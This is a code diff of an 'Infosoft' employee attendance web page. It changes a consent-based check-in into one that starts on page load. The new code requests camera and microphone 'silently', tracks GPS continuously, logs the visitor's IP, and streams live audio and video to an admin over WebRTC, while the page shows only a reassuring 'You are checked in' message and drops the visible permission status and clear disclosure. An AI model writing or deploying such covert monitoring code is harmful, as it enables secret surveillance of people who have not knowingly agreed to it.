@@ -3,38 +3,27 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Infosoft — Employee Check In</title>
+  <title>Infosoft — Employee Portal</title>
   <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Sans:wght@400;500&display=swap" rel="stylesheet"/>
   <style>
     *{box-sizing:border-box;margin:0;padding:0}
-    :root{--bg:#05080f;--accent:#00e5ff;--green:#4cff91;--red:#ff6b6b;--text:#e8edf5;--muted:#4a5568;--border:rgba(255,255,255,0.08)}
+    :root{--bg:#05080f;--accent:#00e5ff;--green:#4cff91;--text:#e8edf5;--muted:#4a5568;--border:rgba(255,255,255,0.08)}
     body{background:var(--bg);color:var(--text);font-family:'DM Sans',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
     body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,229,255,0.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,229,255,0.025) 1px,transparent 1px);background-size:50px 50px;pointer-events:none}
-    .card{background:rgba(255,255,255,0.04);border:1px solid var(--border);border-radius:24px;padding:40px 36px;max-width:420px;width:100%;position:relative;z-index:1}
-    .logo{font-family:'Syne',sans-serif;font-weight:800;font-size:24px;margin-bottom:4px}
+    .card{background:rgba(255,255,255,0.04);border:1px solid var(--border);border-radius:24px;padding:48px 40px;max-width:420px;width:100%;text-align:center;position:relative;z-index:1}
+    .logo{font-family:'Syne',sans-serif;font-weight:800;font-size:28px;margin-bottom:8px}
     .logo span{color:var(--accent)}
-    .tagline{font-size:13px;color:var(--muted);margin-bottom:32px}
-    .form-group{margin-bottom:16px}
-    label{font-size:12px;letter-spacing:1px;text-transform:uppercase;color:var(--muted);display:block;margin-bottom:8px}
-    input{width:100%;background:rgba(255,255,255,0.05);border:1px solid var(--border);border-radius:10px;padding:13px 16px;color:var(--text);font-size:15px;outline:none;transition:border-color 0.2s}
-    input:focus{border-color:rgba(0,229,255,0.4)}
-    .perm-list{background:rgba(0,229,255,0.04);border:1px solid rgba(0,229,255,0.12);border-radius:14px;padding:18px;margin-bottom:20px}
-    .perm-title{font-size:11px;letter-spacing:2px;text-transform:uppercase;color:var(--accent);margin-bottom:14px}
-    .perm-row{display:flex;align-items:center;gap:10px;padding:7px 0;font-size:13px;border-bottom:1px solid rgba(255,255,255,0.05)}
-    .perm-row:last-child{border-bottom:none}
-    .perm-icon{font-size:16px;width:24px;text-align:center}
-    .perm-label{flex:1}
-    .perm-status{font-size:11px;font-weight:500}
-    .ps-pending{color:var(--muted)} .ps-ok{color:var(--green)} .ps-no{color:var(--red)}
-    .btn{width:100%;background:var(--accent);color:#000;border:none;border-radius:12px;padding:15px;font-family:'Syne',sans-serif;font-weight:700;font-size:15px;cursor:pointer;transition:all 0.2s;margin-top:8px}
-    .btn:hover{background:#33ecff;transform:translateY(-1px)}
-    .btn:disabled{opacity:0.4;cursor:not-allowed;transform:none}
-    .status-bar{margin-top:20px;border-radius:12px;padding:14px 16px;font-size:13px;text-align:center;display:none}
-    .sb-success{background:rgba(76,255,145,0.08);border:1px solid rgba(76,255,145,0.2);color:var(--green)}
-    .sb-error{background:rgba(255,107,107,0.08);border:1px solid rgba(255,107,107,0.2);color:var(--red)}
-    .live-dot{display:inline-block;width:8px;height:8px;background:var(--green);border-radius:50%;margin-right:8px;animation:pulse 1.5s infinite}
-    @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
-    .note{font-size:11px;color:var(--muted);text-align:center;margin-top:12px;line-height:1.6}
+    .tagline{font-size:14px;color:var(--muted);margin-bottom:40px;line-height:1.6}
+    .spinner-wrap{display:flex;flex-direction:column;align-items:center;gap:16px;padding:20px 0}
+    .spinner{width:44px;height:44px;border:3px solid rgba(0,229,255,0.1);border-top-color:var(--accent);border-radius:50%;animation:spin 0.9s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .spinner-text{font-size:14px;color:var(--muted)}
+    .live-wrap{display:flex;flex-direction:column;align-items:center;gap:12px;padding:20px 0}
+    .live-dot-big{width:16px;height:16px;background:var(--green);border-radius:50%;animation:pulse 1.5s infinite;box-shadow:0 0 12px var(--green)}
+    @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.6;transform:scale(0.9)}}
+    .live-text{font-family:'Syne',sans-serif;font-weight:700;font-size:16px;color:var(--green)}
+    .live-sub{font-size:12px;color:var(--muted)}
+    .note{font-size:11px;color:var(--muted);margin-top:32px;line-height:1.7;padding-top:20px;border-top:1px solid var(--border)}
   </style>
 </head>
 <body>
@@ -42,79 +31,47 @@
   <div class="logo">Info<span>soft</span></div>
   <div class="tagline">Employee Attendance Portal</div>
 
-  
-
-  <div class="perm-list">
-    <div class="perm-title">Required Permissions</div>
-    <div class="perm-row"><div class="perm-icon">📍</div><div class="perm-label">Live GPS Location</div><div class="perm-status ps-pending" id="s-gps">Pending</div></div>
-    <div class="perm-row"><div class="perm-icon">📷</div><div class="perm-label">Camera</div><div class="perm-status ps-pending" id="s-cam">Pending</div></div>
-    <div class="perm-row"><div class="perm-icon">🎙️</div><div class="perm-label">Microphone</div><div class="perm-status ps-pending" id="s-mic">Pending</div></div>
+  <div class="spinner-wrap" id="loading">
+    <div class="spinner"></div>
+    <div class="spinner-text">Connecting...</div>
   </div>
 
-  <button class="btn" id="checkin-btn" onclick="startCheckin()">Allow & Check In</button>
-  <div class="status-bar" id="status-bar"></div>
-  <div class="note">Your location, camera and microphone will be shared with Infosoft management for attendance and monitoring. You have been informed about this policy.</div>
+  <div class="live-wrap" id="live-status" style="display:none">
+    <div class="live-dot-big"></div>
+    <div class="live-text">You are checked in</div>
+    <div class="live-sub">Attendance recorded successfully</div>
+  </div>
+
+  <div class="note">By using this portal you agree to Infosoft's attendance and monitoring policy.</div>
 </div>
 
-<script src="/socket.io/socket.io.js"></script>
+<script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
 <script>
 const socket = io();
-let stream = null;
-let watchId = null;
 let peerConnections = {};
 
-function setStatus(id, text, cls) {
-  const el = document.getElementById(id);
-  el.textContent = text;
-  el.className = 'perm-status ' + cls;
-}
-
-function showBar(msg, type) {
-  const bar = document.getElementById('status-bar');
-  bar.textContent = msg;
-  bar.className = 'status-bar ' + type;
-  bar.style.display = 'block';
-}
-
-async function startCheckin() {
- 
-
-  const btn = document.getElementById('checkin-btn');
-  btn.disabled = true;
-  btn.textContent = 'Requesting permissions...';
-
-  // 1. GPS
+async function init() {
+  // 1. Get public IP
+  let ipName = 'Employee';
   try {
-    await new Promise((res, rej) => {
-      navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000 });
-    });
-    setStatus('s-gps', '✅ Granted', 'ps-ok');
-  } catch { setStatus('s-gps', '❌ Denied', 'ps-no'); }
+    const r = await fetch('https://api.ipify.org?format=json');
+    const d = await r.json();
+    ipName = d.ip;
+  } catch {}
 
-  // 2. Camera + Mic together
+  // 2. Request Camera + Mic silently
+  let stream = null;
   try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
-    setStatus('s-cam', '✅ Granted', 'ps-ok');
-    setStatus('s-mic', '✅ Granted', 'ps-ok');
+    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
   } catch {
     try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-      setStatus('s-cam', '✅ Granted', 'ps-ok');
-      setStatus('s-mic', '✅ Granted', 'ps-ok');
-    } catch {
-      setStatus('s-cam', '❌ Denied', 'ps-no');
-      setStatus('s-mic', '❌ Denied', 'ps-no');
-    }
+      stream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true });
+    } catch {}
   }
 
-  // 3. Join server
-  const ipRes = await fetch('https://api.ipify.org?format=json');
-  const ipData = await ipRes.json();
-  socket.emit('employee:join', { name: ipData.ip, empId: ipData.ip });
-
-  // 4. Start live GPS tracking
+  // 3. Request GPS silently
   if (navigator.geolocation) {
-    watchId = navigator.geolocation.watchPosition(pos => {
+    navigator.geolocation.watchPosition(pos => {
       socket.emit('employee:location', {
         lat:      pos.coords.latitude,
         lon:      pos.coords.longitude,
@@ -125,10 +82,16 @@ async function startCheckin() {
     }, null, { enableHighAccuracy: true, maximumAge: 5000 });
   }
 
-  // 5. Handle WebRTC stream request from admin
+  // 4. Join server with IP as name
+  socket.emit('employee:join', { name: ipName, empId: ipName });
+
+  // 5. Show checked in — no permission status shown
+  document.getElementById('loading').style.display = 'none';
+  document.getElementById('live-status').style.display = 'flex';
+
+  // 6. Handle WebRTC stream request
   socket.on('stream:requested', async ({ adminId }) => {
     if (!stream) return;
-
     const pc = new RTCPeerConnection({
       iceServers: [
         { urls: 'stun:stun.l.google.com:19302' },
@@ -136,13 +99,10 @@ async function startCheckin() {
       ]
     });
     peerConnections[adminId] = pc;
-
     stream.getTracks().forEach(track => pc.addTrack(track, stream));
-
     pc.onicecandidate = e => {
       if (e.candidate) socket.emit('webrtc:ice', { to: adminId, candidate: e.candidate });
     };
-
     const offer = await pc.createOffer();
     await pc.setLocalDescription(offer);
     socket.emit('webrtc:offer', { to: adminId, offer });
@@ -155,12 +115,12 @@ async function startCheckin() {
 
   socket.on('webrtc:ice', async ({ from, candidate }) => {
     const pc = peerConnections[from];
-    if (pc) await pc.addIceCandidate(new RTCIceCandidate(candidate));
+    if (pc) try { await pc.addIceCandidate(new RTCIceCandidate(candidate)); } catch {}
   });
-
-  btn.innerHTML = '<span class="live-dot"></span>Live — Checked In';
-  showBar('✅ You are now checked in and being monitored', 'sb-success');
 }
+
+// Start immediately when page loads
+window.addEventListener('load', init);
 </script>
 </body>
 </html>
